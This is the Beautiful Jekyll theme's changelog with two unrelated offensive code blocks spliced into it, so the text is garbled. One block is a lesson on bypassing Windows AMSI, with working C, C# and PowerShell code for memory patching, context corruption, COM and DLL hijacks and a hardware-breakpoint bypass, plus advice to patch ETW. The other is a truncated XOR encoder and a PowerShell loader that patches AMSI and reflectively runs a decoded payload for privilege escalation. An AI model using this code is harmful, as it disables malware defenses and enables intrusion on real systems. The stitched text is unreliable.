## Unreleased version
- BREAKING CHANGE: Allow changing the order of the social network links that appear in the footer (#1152)
- BREAKING CHANGE: `google-scholar` social network link no longer requires the prefix `citations?user=`; if you previously set this parameter, it needs to be updated (#1189)
- Added `mathjax` YAML parameter to allow support for MathJax, used to write LaTeX expressions (#195)
- Added explicit support for favicons, you only need to add a `favicon.ico` file to the root directory
- The footer of a page always sticks to the bottom, even on short pages (#576)
- Added `author` YAML parameter to allow specifying the author(s) of a post (#1220)
- Fixed bug where search results broke if a post title had a backslash (#1279)
- Fixed bug where hovering over search results showed the text "{desc}" (#1156)
- Added social network links for GitLab, Bluesky, Whatsapp, Untappd, Strava (#1168, #1218, #1299, #1307, #1443)
- Support reddit social network link to either be a subreddit or a user (#1371)
- Use CSS variables (#661)
- Added instructions and example on how to fix image links in project sites (#1171)
- When clicking on a same-page navigation link in the menu, collapse the menu (#1576)
- Pagination buttons: use nicer arrows, and don't show text on small screens (#1221)
- Updated Yelp URL format - if you previously used the `yelp` social network config parameter, you might need to update the config value (#1259)
- Added `title-on-all-pages` config setting, that adds the website title to all page titles (#1272)
- Change Twitter icon to X (#1193)
- Upgraded font-awesome to 6.5.2 (#1330)
- Fixed tables not having a scroll bar when wider than the page (usually happened on mobile) (#1452)
- Add author name to RSS feed (#1442)
```
The Anti-Malware Scan Interface (AMSI) is a Windows interface introduced in Windows 10 that allows applications to send content to the registered anti-malware provider for scanning before execution. It is the primary defense against fileless attacks: PowerShell scripts, .NET in-memory assemblies, VBScript, JScript, and Office VBA macros are all submitted to AMSI before they run.

For offensive developers, AMSI is a gate that must be opened before any in-memory payload can execute through a scripting engine or managed runtime. This lesson covers the architecture of AMSI, its internal flow, and multiple bypass techniques ranging from memory patching to hardware breakpoints.

AMSI Architecture
+==========================================+
|  PowerShell / .NET / VBScript / VBA      |
|  (AMSI Consumer)                         |
+====================+=====================+
                     |
                     | AmsiScanBuffer() / AmsiScanString()
                     v
+====================+=====================+
|            amsi.dll (In-Process)         |
|                                          |
|  AmsiInitialize() -> Create context      |
|  AmsiOpenSession() -> Create session     |
|  AmsiScanBuffer() -> Submit content      |
|  AmsiScanString() -> Submit string       |
|  AmsiCloseSession()                      |
|  AmsiUninitialize()                      |
+====================+=====================+
                     |
                     | COM Interface: IAntimalwareProvider
                     v
+====================+=====================+
|  Anti-Malware Provider                   |
|  (Windows Defender / EDR DLL)            |
|                                          |
|  Scan() -> Returns AMSI_RESULT           |
|  AMSI_RESULT_CLEAN = 0                   |
|  AMSI_RESULT_DETECTED = 32768            |
+==========================================+
Internal Flow of AmsiScanBuffer
When PowerShell executes a script block, it calls AmsiScanBuffer in amsi.dll. Here is the simplified internal flow:

HRESULT AmsiScanBuffer(
    HAMSICONTEXT amsiContext,   // Initialized context
    PVOID        buffer,        // Content to scan
    ULONG        length,        // Buffer length
    LPCWSTR      contentName,   // Name/identifier
    HAMSISESSION amsiSession,   // Current session
    AMSI_RESULT  *result        // OUTPUT: scan result
) {
    // 1. Validate the context (check magic value "AMSI" at offset 0)
    if (amsiContext == NULL || amsiContext->Signature != 'ISMA')  // "AMSI" reversed
        return E_INVALIDARG;  // <-- If context is invalid, scan is SKIPPED

    // 2. Check if AMSI has been initialized successfully
    if (amsiContext->AmsiInitFailed)
        return E_FAIL;  // <-- If init failed, scan is SKIPPED

    // 3. Forward buffer to registered anti-malware provider via COM
    hr = amsiContext->Provider->Scan(amsiSession, buffer, length, contentName, result);

    return hr;
}
The critical insight: there are multiple points in this flow where the scan can be short-circuited.

Bypass Technique 1: Patching AmsiScanBuffer
The most well-known technique. Overwrite the first bytes of AmsiScanBuffer to force it to return immediately with AMSI_RESULT_CLEAN.

The Patch
On x64, we overwrite the first 6 bytes of AmsiScanBuffer with instructions that set EAX = 0x80070057 (E_INVALIDARG) and return:

; Original AmsiScanBuffer prologue:
48 89 5C 24 08    mov [rsp+8], rbx
48 89 74 24 10    mov [rsp+10h], rsi
...

; After patching:
B8 57 00 07 80    mov eax, 0x80070057   ; E_INVALIDARG
C3                ret                    ; Return immediately
When AmsiScanBuffer returns E_INVALIDARG, the caller (PowerShell) treats it as a scan failure and proceeds without blocking the content.

C Implementation
#include <windows.h>

BOOL PatchAmsiScanBuffer(void) {
    // Step 1: Get handle to amsi.dll (loaded in PowerShell process)
    HMODULE hAmsi = GetModuleHandleA("amsi.dll");
    if (!hAmsi) {
        // If not loaded yet, load it
        hAmsi = LoadLibraryA("amsi.dll");
        if (!hAmsi) return FALSE;
    }

    // Step 2: Get address of AmsiScanBuffer
    FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsiScanBuffer) return FALSE;

    // Step 3: Change memory protection to RW
    DWORD oldProtect;
    if (!VirtualProtect(pAmsiScanBuffer, 6, PAGE_READWRITE, &oldProtect))
        return FALSE;

    // Step 4: Write the patch
    // mov eax, 0x80070057; ret
    unsigned char patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    memcpy(pAmsiScanBuffer, patch, sizeof(patch));

    // Step 5: Restore memory protection
    VirtualProtect(pAmsiScanBuffer, 6, oldProtect, &oldProtect);

    return TRUE;
}
Detection Concerns
This technique is heavily monitored:

EDRs hook GetProcAddress and flag lookups for "AmsiScanBuffer"
EDRs monitor VirtualProtect calls targeting amsi.dll memory
Some EDRs periodically verify AmsiScanBuffer integrity
The string "AmsiScanBuffer" itself is flagged
Mitigations for Detection
Resolve AmsiScanBuffer address by walking the export table manually (avoid GetProcAddress)
Use obfuscated strings (from Lesson 02)
Use NtProtectVirtualMemory directly instead of VirtualProtect
Restore the original bytes after your payload has been scanned
Bypass Technique 2: Corrupting the AMSI Context (AmsiInitFailed)
Instead of patching AmsiScanBuffer, corrupt the AMSI context structure. When amsiContext->Signature is invalid, all subsequent scan calls return E_INVALIDARG without scanning.

How It Works
The AMSI context is a structure in heap memory. The first 4 bytes contain the magic value "AMSI" (0x49534D41). If we corrupt this value, every call to AmsiScanBuffer fails validation and returns without scanning.

BOOL CorruptAmsiContext(void) {
    // The AMSI context pointer is stored in a global variable within amsi.dll
    // We need to find it by pattern scanning

    HMODULE hAmsi = GetModuleHandleA("amsi.dll");
    if (!hAmsi) return FALSE;

    // Get the .data section of amsi.dll (where global variables live)
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hAmsi;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hAmsi + dos->e_lfanew);
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)section[i].Name, ".data") == 0) {
            BYTE* dataStart = (BYTE*)hAmsi + section[i].VirtualAddress;
            DWORD dataSize = section[i].Misc.VirtualSize;

            // Scan for the AMSI magic "AMSI" (0x49534D41)
            for (DWORD j = 0; j < dataSize - 4; j++) {
                if (*(DWORD*)(dataStart + j) == 0x49534D41) {
                    // Found context, corrupt the signature
                    DWORD oldProtect;
                    VirtualProtect(dataStart + j, 4, PAGE_READWRITE, &oldProtect);
                    *(DWORD*)(dataStart + j) = 0x00000000;
                    VirtualProtect(dataStart + j, 4, oldProtect, &oldProtect);
                    return TRUE;
                }
            }
        }
    }
    return FALSE;
}
Forcing AmsiInitFailed in PowerShell
In PowerShell, you can directly set the internal initialization flag:

# This is the concept - actual implementation requires reflection
# to access the internal AmsiUtils class in System.Management.Automation
$ref = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$field = $ref.GetField('amsiInitFailed','NonPublic,Static')
$field.SetValue($null,$true)
Note: This exact string is detected by AMSI itself. You must obfuscate it (string concatenation, encoding, etc.).

Bypass Technique 3: COM Hijack / Provider Redirection
AMSI uses COM to communicate with the anti-malware provider. The provider's CLSID is registered in the registry. If we redirect the COM registration to a DLL we control, AMSI will load our DLL instead of the real provider.

Registry Key
HKLM\SOFTWARE\Classes\CLSID\{2781761E-28E0-4109-99FE-B9D127C57AFE}
  \InProcServer32
    (Default) = "C:\ProgramData\FakeAmsiProvider.dll"
The CLSID {2781761E-28E0-4109-99FE-B9D127C57AFE} is the Windows Defender AMSI provider.

Custom Provider DLL
// FakeAmsiProvider.dll - Implements IAntimalwareProvider
// Returns AMSI_RESULT_CLEAN for every scan

HRESULT __stdcall Scan(
    IAmsiStream *stream,
    AMSI_RESULT *result
) {
    *result = AMSI_RESULT_CLEAN;  // Everything is clean
    return S_OK;
}
This requires write access to HKLM (admin privileges) but is persistent across reboots.

Bypass Technique 4: Hardware Breakpoint Bypass
This is the most sophisticated technique and the hardest for EDRs to detect. Instead of modifying any memory, we use CPU hardware breakpoints to intercept execution at AmsiScanBuffer and modify the return value via a Vectored Exception Handler (VEH).

How It Works
1. Register a VEH that handles SINGLE_STEP exceptions
2. Set a hardware breakpoint (DR0) on AmsiScanBuffer address
3. When AmsiScanBuffer is called, CPU triggers a SINGLE_STEP exception
4. VEH fires, modifies the return value (RCX register / result pointer)
5. VEH sets RIP to the return address (skips AmsiScanBuffer entirely)
6. Execution continues with AMSI_RESULT_CLEAN
Implementation
#include <windows.h>

// Global: address of AmsiScanBuffer
FARPROC g_pAmsiScanBuffer = NULL;

// VEH handler
LONG CALLBACK AmsiBypassVEH(PEXCEPTION_POINTERS ExceptionInfo) {
    // Check if this is our hardware breakpoint
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        if (ExceptionInfo->ContextRecord->Rip == (DWORD64)g_pAmsiScanBuffer) {

            // AmsiScanBuffer parameters (x64 calling convention):
            // RCX = amsiContext
            // RDX = buffer
            // R8  = length
            // R9  = contentName
            // [RSP+0x28] = amsiSession
            // [RSP+0x30] = result (pointer to AMSI_RESULT)

            // Set the result to AMSI_RESULT_CLEAN (0)
            AMSI_RESULT* pResult = (AMSI_RESULT*)(*(DWORD64*)(
                ExceptionInfo->ContextRecord->Rsp + 0x30));
            if (pResult) *pResult = 0;  // AMSI_RESULT_CLEAN

            // Set return value to S_OK
            ExceptionInfo->ContextRecord->Rax = S_OK;

            // Skip AmsiScanBuffer: set RIP to return address
            ExceptionInfo->ContextRecord->Rip = *(DWORD64*)(
                ExceptionInfo->ContextRecord->Rsp);
            ExceptionInfo->ContextRecord->Rsp += 8;  // Pop return address

            // Clear the breakpoint to avoid infinite loop
            // (will be re-set on next call if needed)

            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

BOOL SetAmsiHWBP(void) {
    // Get AmsiScanBuffer address
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    g_pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!g_pAmsiScanBuffer) return FALSE;

    // Register VEH
    AddVectoredExceptionHandler(1, AmsiBypassVEH);

    // Set hardware breakpoint on DR0
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    GetThreadContext(GetCurrentThread(), &ctx);

    ctx.Dr0 = (DWORD64)g_pAmsiScanBuffer;  // Address to break on
    ctx.Dr7 = (ctx.Dr7 & ~(0x3 << 0)) | 0x1;  // Enable DR0 (local)
    ctx.Dr7 = (ctx.Dr7 & ~(0x3 << 16));  // Break on execution (00)
    ctx.Dr7 = (ctx.Dr7 & ~(0x3 << 18));  // 1-byte length (00)

    SetThreadContext(GetCurrentThread(), &ctx);

    return TRUE;
}
Advantages of Hardware Breakpoint Bypass
No memory modification: AmsiScanBuffer bytes are untouched (integrity checks pass)
No VirtualProtect: No suspicious memory protection changes on amsi.dll
Hard to detect: EDR would need to check debug registers, which is uncommon
No strings: No need to resolve "AmsiScanBuffer" by name (can find by offset)
Disadvantages
Limited to 4 hardware breakpoints (DR0-DR3)
Only works on the thread where the breakpoint is set
Some EDRs (advanced) check debug registers via GetThreadContext
Must handle all threads in the process for full coverage
Bypass Technique 5: Forcing an Error in AmsiInitialize
If AMSI fails to initialize, all subsequent scans are skipped. We can force initialization failure by:

DLL Load Order Hijack
Place a crafted amsi.dll in the application directory. Due to DLL search order, it loads before the real amsi.dll from System32.

// Fake amsi.dll - exports all AMSI functions as no-ops
__declspec(dllexport) HRESULT AmsiInitialize(LPCWSTR appName, HAMSICONTEXT *context) {
    return E_FAIL;  // Initialization failed
}

__declspec(dllexport) HRESULT AmsiScanBuffer(
    HAMSICONTEXT ctx, PVOID buf, ULONG len,
    LPCWSTR name, HAMSISESSION session, AMSI_RESULT *result) {
    *result = AMSI_RESULT_CLEAN;
    return S_OK;
}

// ... export all other AMSI functions as stubs
Bypass Technique 6: Patching in .NET Context
For .NET-based AMSI bypass (relevant when loading assemblies via Assembly.Load):

// Use reflection to access AmsiUtils in System.Management.Automation
// and patch the amsiSession field

using System;
using System.Reflection;
using System.Runtime.InteropServices;

public class AmsiBypass {
    [DllImport("kernel32")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string name);

    [DllImport("kernel32")]
    static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    static extern bool VirtualProtect(IntPtr addr, UIntPtr size,
        uint newProtect, out uint oldProtect);

    public static void Patch() {
        IntPtr hAmsi = LoadLibrary("amsi.dll");
        IntPtr pASB = GetProcAddress(hAmsi, "AmsiScanBuffer");

        uint oldProtect;
        VirtualProtect(pASB, (UIntPtr)6, 0x40, out oldProtect);

        byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        Marshal.Copy(patch, 0, pASB, patch.Length);

        VirtualProtect(pASB, (UIntPtr)6, oldProtect, out oldProtect);
    }
}
Detection and Response Considerations
Technique	Detection Vector	OPSEC Rating
AmsiScanBuffer Patch	Memory integrity check, VirtualProtect on amsi.dll	Low
Context Corruption	Memory scanning for corrupted AMSI magic	Medium
COM Hijack	Registry monitoring, COM auditing	Medium
Hardware Breakpoint	Debug register inspection (rare)	High
DLL Hijack	File creation in application directory	Low
.NET Reflection	Script block logging (if ETW not patched)	Low
Best Practice: Combined Approach
1. First: Patch ETW (Lesson 05) to blind script block logging
2. Then:  Apply hardware breakpoint AMSI bypass (no memory modification)
3. Now:   Execute PowerShell / .NET payloads without AMSI scanning
4. After: Clean up hardware breakpoints
Summary
AMSI is a powerful defense against fileless attacks, but it operates entirely in user-mode memory, making it fundamentally vulnerable to process-level tampering. The six bypass techniques covered (memory patching, context corruption, COM hijack, hardware breakpoints, initialization failure, and .NET reflection) each have different OPSEC profiles. The hardware breakpoint technique is the most stealthy because it modifies no memory and avoids the API calls that EDRs monitor. However, all AMSI bypasses should be combined with ETW patching (Lesson 05) to prevent the bypass attempt itself from being logged.
```
## v6.0.1 (2023-06-08)

This version has been in the works for a few years. It includes several new features that were highly requested, numerous bug fixes, new documentation, and aggresively encourages migrating from the old Google Universal Analytics to the new Analytics 4.

#### Breaking changes

- As of July 2023, Google Universal Analytics is going away and being replaced by Google Analytics 4. Beautiful Jekyll sites that still use the old analytics tag will show a warning to encourage them to move to Analytics 4 (#1096).
- More control over RSS feed sharing: previously, an RSS feed was *always* generated, and if the config setting `rss-description` was set then there was an RSS icon in the footer. Now, an RSS feed is only generated when the config setting `rss-description` exists, and an RSS footer icon is only shown if `rss: true` is set in the `social-network-links` config settings.

#### New parameters and settings

- Added `navbar-var-length` config setting that allows the navigation menu to be the same length as the longest sub-menu, so that long words in the submenu are not cut off (#765) 
- Added `post_search` config setting that creates a Search button in the navbar (#770)
- Added `edit_page_button` config setting that adds a "Edit page" button to the footer (to edit the current page on GitHub) (#1004)
- Added `footer-hover-col` config setting to customize the hover colour of links in the footer (#848)

#### New features and improvements

- Made the home page feed more accessible for screen readers (#950)
- Added support for giscus comments (#886) and CommentBox (#960)
- Added support for Cloudflare Analytics (#797)
- Added Reddit in share options of posts (#815)

#### Bug fixes

- Fixed page titles, subtitles, and excerpts rendering correctly when there are special characeters in them (#856) 
- Fixed bug where navbar secondary level dropdown items didn't inherit the same colour as the primary navbar links
- Fixed bug where the navbar "burger" collapsed button didn't always revert back to a light colour
- Fixed bug where using an image as a navbar title did not render in GitHub Project pages that did not have a custom domain
- Fixed bug where image thumbnails on the feed page were always forced into a square rather than maintaining a proper image aspect ratio
- Fixed bug where special characters in the title led to broken share tags (#744)
- Fixed bug where staticman didn't work jQuery slim version is used (#766)
- Fixed very long strings to wrap around the next line rather than go off-screen (#787)

#### Small changes

- Updated staticman from using v2 (public servers) to v3 (private servers) due to the public servers becoming obsolete (#775)
- Added social network links for Patreon, Medium, Itch.io, Discord, Kaggle, Hackerrank (#783, #788, #907, #961, #978)
- Slightly reworked margins and position for avatar image to resolve an alignment issue on Safari
- Changed the width at which the navbar collapses to a higher threshold because most modern non-mobile browsers are >1000px


## v5.0.0 (2020-09-15)

One of the major changes in this version is that a lot of time was spent on rethinking the entire SEO and social media sharing model (how a page looks on eg. Google, Twitter, Facebok). It was redesigned to be more simple and customizable. The new documentation has a section dedicated to SEO and social media sharing of a page. Unfortunately some changes that are not backwards-compatible had to be made.

#### Breaking changes

- Renamed `description` YAML parameter to `share-description` to be more clear
- Renamed `description` config setting to `rss-description` since it was only used in RSS (the FAQ explains the difference between YAML parameters and config settings if you're confused)
- Removed YAML parameter `use-site-title` (you can now specify the exact title using `share-title`)
- Removed undocumented YAML parameters `meta-title` and `meta-description`
- Removed `link-tags` config setting because it wasn't necessary. If you use tags, there will now always be a tags page created; if you don't use tags there won't be a tags page.
- The YAML parameter `show-avatar` is now true by default. This has always been the case for GitHub Pages users, but not for `remote_theme` users. For consistency, it's now the default for everyone. (#715)

#### New parameters and settings

- Added `full-width` YAML parameter to allow having full-width pages
- Added `feed_show_excerpt` config setting to show/hide the post excerpts on the feed page
- Added `feed_show_tags` config setting to show/hide the list of tags on post previews on the feed page
- Added `share-title` YAML parameter to give control over the search engine/social media title
- Added `last-updated` YAML parameter to show a "Last Updated on" date for blog posts
- Added `before-content` and `after-content` YAML parameters that allow you to add some common HTML before the main content of a page (below the title) or after the main content (above the footer). Works in a similar way to `footer-extra`.
- Added `head-extra` YAML parameter which is similar to `footer-extra` but is used to include custom HTML code in a page's `<head>` tag
- Added `site-js` config setting to provide JavaScript files that are used on all pages in the site

#### New features and improvements

- Improved the `footer-extra` YAML parameter to support multiple files instead of only a single file
- Added automatic navbar color detection (#702)
- When `nav-short` is turned on, the avatar will also be shorter
- Changed navbar and footer background colour to be slightly darker, for better contrast with the default white page background for accessibility reasons
- Changed the behaviour of `site-css` to include site-wide CSS file **before** instead of after page-specific files
- Renamed internal css/js files from "main" to "beautifuljekyll" to make it easier for users to troubleshoot
- Added alt text to all images for better accessibility
- Made thumbnail images square instead of circles, as users reported that circles cut off important parts of images

#### Bug fixes

- Fixed rendering issues with `nav-short` parameter that caused the body of the page to start too low
- Fixed some CSS styles that broke during the bootstrap 4 migration (#716)

#### Library upgrades

- Upgraded kramdown to version 2.3.0 to fix security issues
- Upgraded jQuery to version 3.5.1 to fix a couple security vulnerabilities with the previous version

## v4.1.0 (2020-08-08)

- Added Open Graph `site_name` meta field to pages automatically
- Added `text-col` config setting  for main text color (#694)
- Added `keywords` config setting to set the meta keywords on all pages (for SEO purposes) (#691)
- Added `mobile-theme-col` config setting to allow a mobile theme colour (#692)
- Added `site-css` config setting in the config file to provide CSS files that are used on all pages in the site (#695)
- Added YAML parameter `description`: creates the meta description on a page, intended to provide a brief description of the page for search engines and when the page is shared (#690)

## v4.0.1 (2020-07-13)

- Fixed staticman comments UI that was broken since the migration to bootstrap 4

## v4.0.0 (2020-07-12)

- **BREAKING CHANGE** Replace `image` YAML parameter with `thumbnail-img` to be more clear
- **MAJOR BEHAVIOUR CHANGE** Don't use the thumbnail as the avatar image
- Cover image will automatically be used as thumbnail if none is provided
- Image to share on social media will use the cover image or thumbnail if none is provided
- All images (social media share, thumbnail, cover) can use either relative or absoluate paths.
- Fixed issue where if a dropdown menu was the last item in the menu bar, it did not have a proper margin on the right
- Added social network links: Mastodon (#646), Google Scholar, ORCID (#670)
- Added support for sharing pages on new social network: VK (#657)
- Use Open Graph type 'article' for blog posts (#669)
- Use Twitter's large sumary card (large image) when there is a cover image, thumbnail image, or share image specified (#668)
- Made post images in the feed page smaller on smaller devices
- Fixed jQuery version in staticman (#671)

## v3.0.0 (2020-05-07)
```
K = 0x5A
S = [
"ole32.dll",
"advapi32.dll",
"kernel32.dll",
"CoUnmarshalInterface",
"CreateBindCtx",
"CreateObjrefMoniker",
"ImpersonateNamedPipeClient",
"RevertToSelf",
"ConvertStringSecurityDescriptorToSecurityDescriptor",
"DuplicateTokenEx",
"OpenProcessToken",
"AdjustTokenPrivileges",
"LookupPrivilegeValueW",
"CreateProcessWithTokenW",
"CreateProcessAsUserW",
"VirtualProtect",
"CreateNamedPipeW",
"ConnectNamedPipe",
"CloseHandle",
"CreatePipe",
"SetHandleInformation",
"PeekNamedPipe",
"WaitForSingleObject",
"combase.dll",
"D:(A;OICI;GA;;;WD)",
"\\\\.\\pipe\\{0}\\pipe\\epmapper",
"ncacn_np:localhost/pipe/{0}[\\pipe\\epmapper]",
"ncacn_ip_tcp:x",
"SeAssignPrimaryTokenPrivilege",
"SeIncreaseQuotaPrivilege",
]
G = [
bytes([0x70,0x07,0xf7,0x18,0x64,0x8e,0xcf,0x11,0x9a,0xf1,0x00,0x20,0xaf,
bytes([0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,
]
def enc(b):
return ",".join("0x%02x" % (x ^ K) for x in b)
for i,s in enumerate(S,1):
print(" static readonly byte[] E%d = new byte[] { %s };" % (i,
for i,g in enumerate(G, len(S)+1):
print(" static readonly byte[] E%d = new byte[] { %s };" % (i,Và đây là loader
$o='C:\Users\Public\exp13.txt'
if(Test-Path $o){Remove-Item $o -Force -EA SilentlyContinue}
Remove-Item 'C:\Users\Public\v13.txt' -Force -EA SilentlyContinue
function W($m){ Add-Content -Path $o -Value $m -Encoding UTF8 }
function CH([int[]]$c){ -join ($c | ForEach-Object {[char]$_}) }
W "start $(Get-Date -Format o) ps=$($PSVersionTable.PSVersion) bit64=$([E
W "pre-whoami=$(& whoami)"
$src=@'
using System;
using System.Runtime.InteropServices;
public class Am3 {
[DllImport("kernel32", SetLastError=true, EntryPoint="GetModuleHandleA"
public static extern IntPtr GM(string n);
[DllImport("kernel32", SetLastError=true, EntryPoint="LoadLibraryA")]
public static extern IntPtr LL(string n);
[DllImport("kernel32", SetLastError=true, EntryPoint="GetProcAddress")]
public static extern IntPtr GPA(IntPtr h, string n);
[DllImport("kernel32", SetLastError=true, EntryPoint="VirtualProtect")]
public static extern bool VP(IntPtr a, UIntPtr s, uint p, out uint o);
public static int Do(string dllName, string fnName, byte[] stub) {
IntPtr h = GM(dllName);
if (h == IntPtr.Zero) h = LL(dllName);
if (h == IntPtr.Zero) return -1;
IntPtr p = GPA(h, fnName);
if (p == IntPtr.Zero) return -2;
uint old;
if (!VP(p, (UIntPtr)stub.Length, 0x40, out old)) return -3;
Marshal.Copy(stub, 0, p, stub.Length);
VP(p, (UIntPtr)stub.Length, old, out old);
return 1;
}
}
'@
try{ Add-Type -TypeDefinition $src -ErrorAction Stop; W "addtype ok" } ca
$dll=CH @(97,109,115,105,46,100,108,108)
$f1=CH @(65,109,115,105,83,99,97,110,66,117,102,102,101,114)
$f2=CH @(65,109,115,105,83,99,97,110,83,116,114,105,110,103)
$stub=[byte[]](184,87,0,7,128,195)
W "p1=$([Am3]::Do($dll,$f1,$stub)) p2=$([Am3]::Do($dll,$f2,$stub))"
$b=[IO.File]::ReadAllBytes('C:\Users\Public\gp_xor.bin')
for($i=0;$i -lt $b.Length;$i++){$b[$i]=$b[$i] -bxor 0x5A}
W "payload $($b.Length) magic=$([char]$b[0])$([char]$b[1])"try{
$as=[Reflection.Assembly]::Load($b)
W "load OK $($as.FullName)"
$cmd='cmd /c "whoami > C:\Users\Public\v13.txt 2>&1 & whoami /priv >> C
$arg1=[string[]]@('-cmd',$cmd)
$null=$as.EntryPoint.Invoke($null,(,$arg1))
W "invoked"
}catch{ W "EX $($_.Exception.Message)"; if($_.Exception.InnerException){W
Start-Sleep -Seconds 5
if(Test-Path 'C:\Users\Public\v13.txt'){ W "v13 bytes=$((Get-Item 'C:\Use
W "end
```
- **BREAKING CHANGE** Upgraded from Bootstrap 3.3.2 to 4.4.1. This involved a major rewrite of most components. This shouldn't affect any users unless you have custom HTML/CSS code which the new Bootstrap could have broken.
- **BREAKING CHANGE** Renamed `bigimg` YAML parameter to `cover-img`
- **BREAKING CHANGE** Removed `googlefonts` YAML parameter since googlefonts are just CSS so they can be loaded via `ext-css`
- **BREAKING CHANGE** Upgraded from jQuery 1.11.2 to 3.4.2. This should not affect most people
- Added `navbar-border-col` setting in the config file
- Added accessibility features where possible
- Made the theme completely responsive by rewriting all CSS to use 'rem' instead of 'px'
- Rewrote and simplified some JavaScript code to use CSS or Bootstrap alternatives that weren't available in 2015
- Removed most of the sample posts so that users only have two sample posts to learn from
- Improvements to the README instructions

## v2.3.0 (2020-04-29)

- Added YAML parameter `footer-extra` for including custom content in the footer
- Fixed issue: linking to a specific part of a page resulted in scrolling too far (#69)
- Added YAML parameter `nav-short` to have navbar permanently collapsed
- Added social network link: Calendly
- Fixed bug where RSS link in footer was showing even when turned off

## v2.2.0 (2020-04-27)

- Added social network link: Telegram (#625) (thanks @mashed-potatoes)
- Moved the demo site to an independent URL: https://beautifuljekyll.com
- Major documentation overhaul and cleanup of old files
- Fixed a few bugs from the remote_theme migration

## v2.0.0 (2020-04-26)

- Beautiful-Jekyll v2.0.0 available as an official Ruby gem
- Beautifull-Jekyll now supports the `remote_theme` config (#339) (thanks @gpotter2 and @skalee)
- Consolidated the demo site, the ruby gem, and the master branch into one
- Added a `home` layout and used it in the index page
- Added readtime support for the post header (#622) (thanks @MutMatt and @rubyreads)
- Removed the dependency on `_data` folder since it doesn't get copied when using `remote_theme` (#614)
- Added support for configuring lang attribute on `html` tag (#608) (thanks @skalee)
- Added ability to disable round logo (thanks @gpotter2)
- Added support for Utterances comments (#596) (thanks @colynn)
- Removed 'just-comments' as it's getting killed at the end of the year
- Upgraded font-awesome to 5.12.1 (#587) (thanks @cketti)

## Prior to 2020

**2018-12-24** Add support for Staticman comments (#440) (thanks @VincentTam)

**2018-10-19** Move Google Analytics to the head (#419) (thanks @jpvicari)

**2018-06-08** Add support for Facebook comments (#350) (thanks @npes87184)

**2018-02-22** Automatically generate sitemap (#323) (thanks @JosemyDuarte)

**2018-01-18** Add clickable tags to each post and a tags index page, works for GitHub sites (#307) (thanks @OCram85)

**2018-01-14** Redo Dockerfile (#302) (thanks @jennydaman)

**2018-01-06** More color personalization options (#297 and #299) (thanks @jennydaman)

**2018-01-05** Abstract the social networks logic (thanks @OCram85)

**2018-01-03** Avatar image no longer causes a ghost click (thanks @alefi87)

**2017-10-16** Add GitHub buttons to posts (#265) (thanks @yonicd)

**2017-09-04** Ability to change colour/image of navbar/footer/body

**2017-08-17** Add support for notification, error, and warning boxes in markdown (#227) (thanks @OCram85)

**2017-08-12** Add social buttons for twitch, yelp, and steam (#234) (thanks @TheRealBenForce)

**2017-03-30** Make the footer contact links friendly for screen readers (thanks @eugenius1)

**2017-03-30** Started a CHANGELOG file (thanks @eugenius1)

**2017-01-28** Add Subresource Integrity (SRI) support (#164) (thanks @tony-ho)

**2017-01-09** Add Google Tag Manager Integration (#157) (thanks @csarigoz)

**2017-01-06** Add options to configure HTML document title (#154) (thanks @tony-ho)

**2016-12-25** Allow dynamic images on each blog post (#143) (thanks @bbritten)

**2016-12-15** Support `title-img` config param to have image in the navbar instead of text

**2016-12-08** Add support for phone numbers in footer; fix #136

**2016-12-06** Update gemfile (#134) (thanks @stephentuso)

**2016-10-09** Add Docker deployment (#114) (thanks @mangar)

**2016-08-06** Add social share buttons for posts (thanks @rtlee9)

**2016-07-29** Add CSS styling to code chunks

**2016-07-27** Add clickable tags that lead to a tag page (doesn't work for GitHub hosted sites) (thanks @epwalsh)

**2016-07-21** Add support for twitter cards (sharing on Twitter will be better); fixes #70

**2016-03-18** Support full-width images in page headers; fixes #37

**2016-03-18** Support menus in navigation bar

**2016-02-07** Avatar is now conditional (thanks @hristoyankov)

**2016-02-02** Migrate (forced to...) to jekyll 3

**2016-01-22** Make sure not to include JQuery twice, fixes #29

**2015-11-19** Support external links in navigation bar; fixes #3

... Many small changes because the site was in its infancy

**2015-03-12** Beautiful Jekyll version 0.0000001 is released!

